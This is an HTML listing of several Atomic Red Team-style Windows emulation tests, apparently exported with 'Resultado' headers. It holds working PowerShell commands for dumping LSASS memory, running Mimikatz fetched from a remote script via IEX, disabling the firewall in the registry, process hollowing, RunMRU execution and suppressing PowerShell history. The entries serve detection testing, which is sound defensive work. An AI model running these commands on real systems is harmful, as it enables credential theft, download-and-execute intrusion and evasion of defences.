<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: None</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: 6502c8f0-b775-4dbd-9193-1298f56b6781</li>
<li><strong>name</strong>: Dump LSASS.exe Memory using Out-Minidump.ps1</li>
<li><strong>description</strong>: The memory of lsass.exe is often dumped for offline credential theft attacks. This test leverages a pure
powershell implementation that leverages the MiniDumpWriteDump Win32 API call.
Upon successful execution, you should see the following file created $env:TEMP\lsass_*.dmp.</li>
</ul>
<p>Author of Out-Minidump: Matthew Graeber (@mattifestation)</p>
<ul>
<li><strong>platforms</strong>: ['windows']</li>
<li>
<p><strong>command</strong>: [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
New-Item -Type Directory "PathToAtomicsFolder..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
try{ IEX (IWR 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1003.001/src/Out-Minidump.ps1') -ErrorAction Stop}
catch{ $<em>; exit $</em>.Exception.Response.StatusCode.Value__}
get-process lsass | Out-Minidump</p>
</li>
<li>
<p><strong>prereq_command</strong>: </p>
</li>
<li><strong>get_prereq_command</strong>: </li>
<li>
<p><strong>cleanup_command</strong>: Remove-Item $env:TEMP\lsass_*.dmp -ErrorAction Ignore</p>
</li>
<li>
<p><strong>mitre_id</strong>: T1003.001</p>
</li>
<li><strong>input_arguments.output_file</strong>: None</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: None</li>
<li><strong>input_arguments.uacme_exe</strong>: None</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: None</li>
<li><strong>input_arguments.password</strong>: None</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: None</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: 66fb0bc1-3c3f-47e9-a298-550ecfefacbc</li>
<li><strong>name</strong>: Powershell Mimikatz</li>
<li>
<p><strong>description</strong>: Dumps credentials from memory via Powershell by invoking a remote mimikatz script.
If Mimikatz runs successfully you will see several usernames and hashes output to the screen.
Common failures include seeing an \"access denied\" error which results when Anti-Virus blocks execution. 
Or, if you try to run the test without the required administrative privileges you will see this error near the bottom of the output to the screen "ERROR kuhl_m_sekurlsa_acquireLSA"</p>
</li>
<li>
<p><strong>platforms</strong>: ['windows']</p>
</li>
<li>
<p><strong>command</strong>: IEX (New-Object Net.WebClient).DownloadString('#{remote_script}'); Invoke-Mimikatz -DumpCreds</p>
</li>
<li>
<p><strong>prereq_command</strong>: </p>
</li>
<li><strong>get_prereq_command</strong>: </li>
<li><strong>cleanup_command</strong>: </li>
<li><strong>mitre_id</strong>: T1003.001</li>
<li><strong>input_arguments.output_file</strong>: None</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: None</li>
<li><strong>input_arguments.uacme_exe</strong>: None</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: None</li>
<li><strong>input_arguments.password</strong>: None</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: None</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: 80b453d1-eec5-4144-bf08-613a6c3ffe12</li>
<li><strong>name</strong>: LockBit Black - Unusual Windows firewall registry modification -Powershell</li>
<li>
<p><strong>description</strong>: An adversary tries to modify the windows firewall registry.</p>
</li>
<li>
<p><strong>platforms</strong>: ['windows']</p>
</li>
<li>
<p><strong>command</strong>: New-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\WindowsFirewall\DomainProfile" -Name EnableFirewall -PropertyType DWORD -Value 0 -Force
New-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\WindowsFirewall\StandardProfile" -Name EnableFirewall -PropertyType DWORD -Value 0 -Force</p>
</li>
<li>
<p><strong>prereq_command</strong>: </p>
</li>
<li><strong>get_prereq_command</strong>: </li>
<li>
<p><strong>cleanup_command</strong>: Remove-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\WindowsFirewall\DomainProfile"  -Name EnableFirewall -Force -ErrorAction Ignore
Remove-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\WindowsFirewall\StandardProfile" -Name EnableFirewall -Force -ErrorAction Ignore</p>
</li>
<li>
<p><strong>mitre_id</strong>: T1562.004</p>
</li>
<li><strong>input_arguments.output_file</strong>: None</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: None</li>
<li><strong>input_arguments.uacme_exe</strong>: None</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: None</li>
<li><strong>input_arguments.password</strong>: None</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: None</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: 562427b4-39ef-4e8c-af88-463a78e70b9c</li>
<li><strong>name</strong>: Process Hollowing using PowerShell</li>
<li>
<p><strong>description</strong>: This test uses PowerShell to create a Hollow from a PE on disk with explorer as the parent.
Credit to FuzzySecurity (https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Start-Hollow.ps1)</p>
</li>
<li>
<p><strong>platforms</strong>: ['windows']</p>
</li>
<li>
<p><strong>command</strong>: . "$PathToAtomicsFolder\T1055.012\src\Start-Hollow.ps1"
$ppid=Get-Process #{parent_process_name} | select -expand id
Start-Hollow -Sponsor "#{sponsor_binary_path}" -Hollow "#{hollow_binary_path}" -ParentPID $ppid -Verbose</p>
</li>
<li>
<p><strong>prereq_command</strong>: </p>
</li>
<li><strong>get_prereq_command</strong>: </li>
<li>
<p><strong>cleanup_command</strong>: Stop-Process -Name "#{spawnto_process_name}" -ErrorAction Ignore</p>
</li>
<li>
<p><strong>mitre_id</strong>: T1055.012</p>
</li>
<li><strong>input_arguments.output_file</strong>: None</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: None</li>
<li><strong>input_arguments.uacme_exe</strong>: None</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: None</li>
<li><strong>input_arguments.password</strong>: None</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: None</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: 88f6327e-51ec-4bbf-b2e8-3fea534eab8b</li>
<li><strong>name</strong>: Read volume boot sector via DOS device path (PowerShell)</li>
<li><strong>description</strong>: This test uses PowerShell to open a handle on the drive volume via the <code>\\.\</code> <a href="https://docs.microsoft.com/en-us/dotnet/standard/io/file-path-formats#dos-device-paths">DOS device path specifier</a> and perform direct access read of the first few bytes of the volume.
On success, a hex dump of the first 11 bytes of the volume is displayed.</li>
</ul>
<p>For a NTFS volume, it should correspond to the following sequence (<a href="https://en.wikipedia.org/wiki/NTFS#Partition_Boot_Sector_(VBR)">NTFS partition boot sector</a>):
```
           00 01 02 03 04 05 06 07 08 09 0A 0B 0C 0D 0E 0F</p>
<p>00000000   EB 52 90 4E 54 46 53 20 20 20 20                 ëR?NTFS
```
- <strong>platforms</strong>: ['windows']
- <strong>command</strong>: $buffer = New-Object byte[] 11
$handle = New-Object IO.FileStream "\.#{volume}", 'Open', 'Read', 'ReadWrite'
$handle.Read($buffer, 0, $buffer.Length)
$handle.Close()
Format-Hex -InputObject $buffer</p>
<ul>
<li><strong>prereq_command</strong>: </li>
<li><strong>get_prereq_command</strong>: </li>
<li><strong>cleanup_command</strong>: </li>
<li><strong>mitre_id</strong>: T1006</li>
<li><strong>input_arguments.output_file</strong>: None</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: None</li>
<li><strong>input_arguments.uacme_exe</strong>: None</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: None</li>
<li><strong>input_arguments.password</strong>: None</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: None</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: de323a93-2f18-4bd5-ba60-d6fca6aeff76</li>
<li><strong>name</strong>: Indirect Command Execution - RunMRU Dialog</li>
<li>
<p><strong>description</strong>: Simulates execution of commands via the Windows Run dialog (Win+R) by programmatically opening the Run dialog, 
copying a command to clipboard, and automating the paste and execution. This generates artifacts in the RunMRU registry key,
which is commonly abused by threat actors to execute malicious commands disguised as CAPTCHA verification steps.
Upon execution, a test PowerShell command will be executed through the Run dialog.</p>
</li>
<li>
<p><strong>platforms</strong>: ['windows']</p>
</li>
<li><strong>command</strong>: # Copy command to clipboard
Set-Clipboard -Value '#{command}'</li>
</ul>
<h1>Open Run dialog</h1>
<p>Start-Process -FilePath "powershell" -ArgumentList "-c (New-Object -ComObject 'Shell.Application').FileRun()" -WindowStyle Hidden</p>
<h1>Wait for Run dialog to open</h1>
<p>Start-Sleep -Seconds 1</p>
<h1>Paste command and execute</h1>
<p>Add-Type -AssemblyName System.Windows.Forms</p>
<p>Start-Sleep -Milliseconds 500</p>
<ul>
<li><strong>prereq_command</strong>: </li>
<li><strong>get_prereq_command</strong>: </li>
<li><strong>cleanup_command</strong>: </li>
<li><strong>mitre_id</strong>: T1202</li>
<li><strong>input_arguments.output_file</strong>: None</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: None</li>
<li><strong>input_arguments.uacme_exe</strong>: None</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: None</li>
<li><strong>input_arguments.password</strong>: None</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: None</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: 2f898b81-3e97-4abb-bc3f-a95138988370</li>
<li><strong>name</strong>: Prevent Powershell History Logging</li>
<li>
<p><strong>description</strong>: Prevents Powershell history</p>
</li>
<li>
<p><strong>platforms</strong>: ['windows']</p>
</li>
<li>
<p><strong>command</strong>: Set-PSReadlineOption -HistorySaveStyle SaveNothing</p>
</li>
<li>
<p><strong>prereq_command</strong>: </p>
</li>
<li><strong>get_prereq_command</strong>: </li>
<li><strong>cleanup_command</strong>: Set-PSReadLineOption -HistorySaveStyle SaveIncrementally</li>
<li><strong>mitre_id</strong>: T1070.003</li>
<li><strong>input_arguments.output_file</strong>: None</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: None</li>
<li><strong>input_arguments.uacme_exe</strong>: None</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: None</li>
<li><strong>input_arguments.password</strong>: None</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
